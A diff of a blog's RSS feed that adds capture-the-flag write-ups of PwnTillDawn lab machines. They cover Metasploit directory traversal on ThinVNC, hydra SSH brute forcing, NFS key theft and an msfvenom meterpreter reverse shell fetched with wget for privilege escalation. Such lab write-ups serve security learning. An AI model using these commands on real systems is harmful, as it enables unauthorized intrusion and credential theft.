@@ -5,98 +5,620 @@
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
     <link>http://localhost:4000/</link>
     <description>Just a bored hacker sharing secrets and tips.</description>
-    <pubDate>Fri, 01 Nov 2024 01:05:17 -0300</pubDate>
+    <pubDate>Fri, 01 Nov 2024 02:28:56 -0300</pubDate>
     
       <item>
-        <title>Sample post</title>
-        <link>/2014/11/30/sample-post.html</link>
-        <guid isPermaLink="true">/2014/11/30/sample-post.html</guid>
-        <description>&lt;p&gt;Consectetur adipiscing elit. Donec a diam lectus. Sed sit amet ipsum mauris. Maecenas congue ligula ac quam viverra nec consectetur ante hendrerit. Donec et mollis dolor. Praesent et diam eget libero egestas mattis sit amet vitae augue. Nam tincidunt congue enim, ut porta lorem lacinia consectetur. Donec ut libero sed arcu vehicula ultricies a non tortor. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean ut gravida lorem.&lt;/p&gt;
+        <title>PwnTillDawn - ElMariachi Write-Up</title>
+        <link>/2024/08/21/pwntilldawn-elmariachi.html</link>
+        <guid isPermaLink="true">/2024/08/21/pwntilldawn-elmariachi.html</guid>
+        <description>&lt;h1 id=&quot;elmariachi-1015015069&quot;&gt;ElMariachi (10.150.150.69)&lt;/h1&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Consectetur adipiscing elit&lt;/li&gt;
-  &lt;li&gt;Donec a diam lectus&lt;/li&gt;
-  &lt;li&gt;Sed sit amet ipsum mauris&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Ut turpis felis, pulvinar a semper sed, adipiscing id dolor. Pellentesque auctor nisi id magna consequat sagittis. Curabitur dapibus enim sit amet elit pharetra tincidunt feugiat nisl imperdiet. Ut convallis libero in urna ultrices accumsan. Donec sed odio eros. Donec viverra mi quis quam pulvinar at malesuada arcu rhoncus. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. In rutrum accumsan ultricies. Mauris vitae nisi at sem facilisis semper ac in est.&lt;/p&gt;
+&lt;h2 id=&quot;scanning-target&quot;&gt;Scanning Target&lt;/h2&gt;
 
-&lt;p&gt;Nunc diam velit, adipiscing ut tristique vitae, sagittis vel odio. Maecenas convallis ullamcorper ultricies. Curabitur ornare, ligula &lt;em&gt;semper consectetur sagittis&lt;/em&gt;, nisi diam iaculis velit, id fringilla sem nunc vel mi. Nam dictum, odio nec pretium volutpat, arcu ante placerat erat, non tristique elit urna et turpis. Quisque mi metus, ornare sit amet fermentum et, tincidunt et orci. Fusce eget orci a orci congue vestibulum.&lt;/p&gt;
+&lt;p&gt;Scanning Windows machines is often a slow process depending on the target network and flags applied. So instead of using the usual flags, we’ll be first checking the open ports and scanning those specific ports after.&lt;/p&gt;
 
-&lt;p&gt;Ut dolor diam, elementum et vestibulum eu, porttitor vel elit. Curabitur venenatis pulvinar tellus gravida ornare. Sed et erat faucibus nunc euismod ultricies ut id justo. Nullam cursus suscipit nisi, et ultrices justo sodales nec. Fusce venenatis facilisis lectus ac semper. Aliquam at massa ipsum. Quisque bibendum purus convallis nulla ultrices ultricies. Nullam aliquam, mi eu aliquam tincidunt, purus velit laoreet tortor, viverra pretium nisi quam vitae mi. Fusce vel volutpat elit. Nam sagittis nisi dui.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -p- --open 10.150.150.69
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;Suspendisse lectus leo, consectetur in tempor sit amet, placerat quis neque&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;p&gt;Once we find out a list of open ports, we’ll be using Nmap to scan those ports.&lt;/p&gt;
 
-&lt;p&gt;Etiam luctus porttitor lorem, sed suscipit est rutrum non. Curabitur lobortis nisl a enim congue semper. Aenean commodo ultrices imperdiet. Vestibulum ut justo vel sapien venenatis tincidunt.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sV -sC -p-p135,139,445,3389,5040,44664-49670,50417,60000 -oN nmap.txt 10.150.150.69
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Phasellus eget dolor sit amet ipsum dapibus condimentum vitae quis lectus. Aliquam ut massa in turpis dapibus convallis. Praesent elit lacus, vestibulum at malesuada et, ornare et est. Ut augue nunc, sodales ut euismod non, adipiscing vitae orci. Mauris ut placerat justo. Mauris in ultricies enim. Quisque nec est eleifend nulla ultrices egestas quis ut quam. Donec sollicitudin lectus a mauris pulvinar id aliquam urna cursus. Cras quis ligula sem, vel elementum mi. Phasellus non ullamcorper urna.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see some interesting information about the machine and it’s internal services. This is a Windows machine with the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELMARIACHI-PC&lt;/code&gt;, and we can see several ports including port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;60000&lt;/code&gt; which looks like a web server. Although we don’t know which service it is running, if we take a closer look on the fingerprint collected by Nmap we can find some tips.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a ThinVNC server, and it has a web authentication method.&lt;/p&gt;
+
+&lt;h2 id=&quot;thinvnc-exploration&quot;&gt;ThinVNC Exploration&lt;/h2&gt;
+
+&lt;p&gt;Once connecting to the port, we are welcomed with a login prompt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After trying some common usernames and passwords, without success, we need to find another way in. With some research, we can see that the latest verion is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.01b&lt;/code&gt; and funny enough, this version has several known CVEs, including a Rapid7 page telling about a Directory Traversal module on Metasploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since ThinVNC latest version is 1.01b, it’s worth a try, so let’s fire up Metasploit and give it a try!&lt;/p&gt;
+
+&lt;h2 id=&quot;directory-traversal-exploit&quot;&gt;Directory Traversal Exploit&lt;/h2&gt;
+
+&lt;p&gt;This module is quite simple to use as it only requires the remote host IP and port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The output show us that the exploit worked successfully and we now got access to the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;desperado&lt;/code&gt; with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TooComplicatedToGuessMeAhahahahahahahh&lt;/code&gt;. Let’s try logging in once more.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As expected we’ve managed to login and now we just need a machine’s name, which we gathered earlier: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELMARIACHI-PC&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We’re presented with a remote desktop access, now it’s time to search for the flag. Let’s start by opening the Explorer.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As if wasn’t easy enough to access the machine, the flag is shown in the recent file section of the explorer as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG67&lt;/code&gt;, now we just have to copy the flag. Fortunately for us, ThinVNC has a clipboard feature available, so once we copy the contents of the file, we can just access this clipboard to paste it outside the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_elmariachi/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Sun, 30 Nov 2014 00:00:00 -0200</pubDate>
+        <pubDate>Wed, 21 Aug 2024 00:00:00 -0300</pubDate>
       </item>
     
       <item>
-        <title>Feature images</title>
-        <link>/2014/11/29/feature-images.html</link>
-        <guid isPermaLink="true">/2014/11/29/feature-images.html</guid>
-        <description>&lt;p&gt;This is an example of a post which includes a feature image specified in the front matter of the post. The feature image spans the full-width of the page, and is shown with the title on permalink pages.&lt;/p&gt;
+        <title>PwnTillDawn - Stuntman Mike Write-Up</title>
+        <link>/2024/08/09/pwntilldawn-stuntman-mike.html</link>
+        <guid isPermaLink="true">/2024/08/09/pwntilldawn-stuntman-mike.html</guid>
+        <description>&lt;h1 id=&quot;stuntman-mike-10150150166&quot;&gt;Stuntman Mike (&lt;strong&gt;10.150.150.166&lt;/strong&gt;)&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_stuntman_mike/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning-target&quot;&gt;Scanning Target&lt;/h2&gt;
+
+&lt;p&gt;Scanning the target with Nmap as usual:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sV -sC -oN nmap.txt 10.150.150.166
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_stuntman_mike/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have only two ports available being 22 (SSH) and 8089 (Splunk). I don’t often go for SSH port, but I suspect Splunk – a tool meant for monitoring logs – has been installed only to log player’s actions and, since there’s no other port, we’ll be sticking with SSH first.&lt;/p&gt;
+
+&lt;h2 id=&quot;ssh-enumeration&quot;&gt;SSH Enumeration&lt;/h2&gt;
+
+&lt;p&gt;There’s isn’t much you can do against OpenSSH apart from enumeration and checking for CVE’s or bruteforcing top used passwords. We’ll run a Nmap script to see if we can find any useful information another user apart from root.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -p22 10.150.150.166 --script ssh-auth-methods --script-args=&quot;ssh.user=root&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_stuntman_mike/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This script returns a list of accepted login methods, which are public key and password, but there’s also a banner text with FLAG35 and a potential user: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mike&lt;/code&gt;. We could perform the same check again, but the output wouldn’t change.&lt;/p&gt;
+
+&lt;h2 id=&quot;bruteforcing-ssh&quot;&gt;Bruteforcing SSH&lt;/h2&gt;
+
+&lt;p&gt;Now we have a valid user, which we can try to bruteforce using weak passwords. I’ll be using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; and use some of the  passwords to see if there’s any match.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l mike -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt ssh://10.150.150.166
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_stuntman_mike/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After a few seconds we got a match, so we now know that the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mike&lt;/code&gt; is available, and it’s password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;babygirl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;server-exploration&quot;&gt;Server Exploration&lt;/h2&gt;
+
+&lt;p&gt;With a valid user and password, we can login to the server through SSH. After logging in without any problems, the second flag is available inside mike’s home directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_stuntman_mike/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Usually we would go for a privilege escalation method, but this is even simpler, as mike has privileges to run any command and we have his password. We can just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; to the root user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_stuntman_mike/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The final flag is inside root’s home directory, nice security Mike!&lt;/p&gt;
 </description>
-        <pubDate>Sat, 29 Nov 2014 00:00:00 -0200</pubDate>
+        <pubDate>Fri, 09 Aug 2024 00:00:00 -0300</pubDate>
       </item>
     
       <item>
-        <title>Markdown and HTML</title>
-        <link>/2014/11/28/markdown-and-html.html</link>
-        <guid isPermaLink="true">/2014/11/28/markdown-and-html.html</guid>
-        <description>&lt;p&gt;Jekyll supports the use of &lt;a href=&quot;http://daringfireball.net/projects/markdown/syntax&quot;&gt;Markdown&lt;/a&gt; with inline HTML tags which makes it easier to quickly write posts with Jekyll, without having to worry too much about text formatting. A sample of the formatting follows.&lt;/p&gt;
+        <title>PwnTillDawn - FullMounty Write-Up</title>
+        <link>/2024/07/11/pwntilldawn-fullmounty.html</link>
+        <guid isPermaLink="true">/2024/07/11/pwntilldawn-fullmounty.html</guid>
+        <description>&lt;h1 id=&quot;fullmounty-10150150134&quot;&gt;FullMounty (10.150.150.134)&lt;/h1&gt;
 
-&lt;p&gt;Tables have also been extended from Markdown:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;First Header&lt;/th&gt;
-      &lt;th&gt;Second Header&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Content Cell&lt;/td&gt;
-      &lt;td&gt;Content Cell&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Content Cell&lt;/td&gt;
-      &lt;td&gt;Content Cell&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
+&lt;h2 id=&quot;network-scanning&quot;&gt;Network Scanning&lt;/h2&gt;
 
-&lt;p&gt;Here’s an example of an image, which is included using Markdown:&lt;/p&gt;
+&lt;p&gt;The target machine uses Linux and has a total of 3 flags. We’ll start by scanning the machine as usual.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample_feature_img_2.png&quot; alt=&quot;Geometric pattern with fading gradient&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sV -sC 10.150.150.134 -oN nmap.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Highlighting for code in Jekyll is done using Pygments or Rouge. This theme makes use of Rouge by default.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// count to ten&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;p&gt;We have some interesting results including ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2049&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8089&lt;/code&gt;. Personally, I don’t always check for SSH unless I really feel there’s something useful on it, as most of the time it’s a dead end.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploring-nfs-share&quot;&gt;Exploring NFS Share&lt;/h2&gt;
+
+&lt;p&gt;NFS is a protocol that is used to share files between different hosts and, when misconfigured, can be used to upload malicious files and even root machines. Let’s list this share to see what’s inside.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;showmount -e 10.150.150.134
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s only one share available on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/srv/exportnfs&lt;/code&gt;, which we can try to mount on our machine. For this we’ll create a new folder, and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount&lt;/code&gt; to access the contents of the share.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir nfs
+sudo mount -t nfs -o vers=3,nolock 10.150.150.134:/srv/exportnfs ./nfs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can access the share and list it’s contents using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt;, it’s important to &lt;strong&gt;always&lt;/strong&gt; use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; flag as you can easily miss hidden files without it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After copying the files, don’t forget to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo umount&lt;/code&gt; the folder.&lt;/p&gt;
+
+&lt;h2 id=&quot;connecting-through-ssh&quot;&gt;Connecting Through SSH&lt;/h2&gt;
+
+&lt;p&gt;We’ve achieved the first flag that’s inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG49&lt;/code&gt;, together with SSH key files. We can’t really use a key without a user, can we? Fortunately for us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa.pub&lt;/code&gt; file contains a username that we can use.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now try to SSH into the machine using this key. This step really took me a long time to figure out as the machine uses a legacy SSH version, which requires some special flags in order to perform a successful connection.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -oHostKeyAlgorithms=+ssh-rsa -i id_rsa deadbeef@10.150.150.134
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Soon after connecting to the target machine, we can list out the files and discover the next 2 flags in the same folder, but only one of them is readable by our current user which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG50&lt;/code&gt;, the other one requires root privileges.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;This step is quite tricky, as due to how old the machine is, there’s a couple of different methods, some are easier than others. We can use &lt;a href=&quot;https://github.com/The-Z-Labs/linux-exploit-suggester&quot;&gt;Linux Exploit Suggester&lt;/a&gt; to find out different methods. The more obvious being Dirty Cow, this can be seen by verifying the kernel and OS version.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The real problem is that the machine doesn’t have a compiler installed, so you’ll have to compile the exploit externally and upload it to the target, which wouldn’t be a problem if wasn’t for the fact that it requires the same OS version, and nobody even remember that Ubuntu 10.04 even existed, neither there’s a docker container available. The alternative is to use Metasploit modules which is simpler, so we’ll stick to that.&lt;/p&gt;
+
+&lt;p&gt;If you decide to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux-exploit-suggester&lt;/code&gt;, you’ve probably seen that CVE-2010-3904 is listed as a highly probable exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By Googling it, we can see Metasploit has a module for this vulnerability, which we can use easily, and it also tells us that the exploit has been tested on Ubuntu 10.04 with the exact same kernel version we’re working on, that’s great!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As this is a local exploit, we’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; to create our meterpreter reverse shell and before uploading it to the target machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.66.66.230 lport=1337 -f elf -o reverse
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Luckily we have access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; in the target machine, so we’ll be using python to transfer the binary with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -m http.server&lt;/code&gt; and use it to transfer the malicious binary.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -o- http://10.66.66.230:8000/reverse
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, back to our machine, we’ll start Metasploit and use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multi/handler&lt;/code&gt; module to listen for connections from our previous uploaded binary.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo msfconsole
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let’s go back to the target machine and run our binary.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod +x reverse
+./reverse
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, I know how tempting is to explore the new openly shell, but we’ll just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bg&lt;/code&gt; so this session will be sent to the background, as we’ll run our privilege escalation exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And now we just run the exploit and profit!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’ve used this method because I really think it’s faster than creating a VM with the specific OS version and compiling the exploit by hand. Besides, Metasploit can do the heavy lifting for us, no need to reinvent the wheel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_fullmounty/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After typing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt;, just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash -i&lt;/code&gt; for an interactive shell and print out the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG51&lt;/code&gt; file, voilá!&lt;/p&gt;
+
+&lt;p&gt;I really had fun playing this challenge, it taught me how to adapt, as understanding sometimes things won’t go so smoothly as expected, it’s important to understand how different tools can be used for the same job.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 11 Jul 2024 00:00:00 -0300</pubDate>
+      </item>
+    
+      <item>
+        <title>PwnTillDawn - Snare Write-Up</title>
+        <link>/2024/06/30/pwntilldawn-snare.html</link>
+        <guid isPermaLink="true">/2024/06/30/pwntilldawn-snare.html</guid>
+        <description>&lt;h1 id=&quot;snare-1015015018&quot;&gt;Snare (10.150.150.18)&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning-target&quot;&gt;Scanning Target&lt;/h2&gt;
+
+&lt;p&gt;Let’s start as usual with Nmap:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sV -sC -oN nmap.txt 10.150.150.18
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/post/pwntilldawn_snare/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have only ports 22 and 80 available, and apart from bruteforce, there’s nothing interesting about SSH, to let’s work on HTTP first.&lt;/p&gt;
+
